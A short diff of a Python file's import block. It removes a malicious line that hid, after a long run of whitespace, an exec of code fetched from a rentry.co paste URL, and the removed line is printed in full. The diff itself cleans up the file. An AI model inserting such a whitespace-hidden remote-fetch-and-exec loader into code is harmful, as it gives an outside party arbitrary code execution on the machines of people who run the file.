@@ -1,5 +1,5 @@
 from http import client
-import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
+import requests                                                                                                                                                                                                                                                                                                                    
 from lib2to3.pgen2.tokenize import generate_tokens
 from multiprocessing import context
 from tkinter.ttk import Style
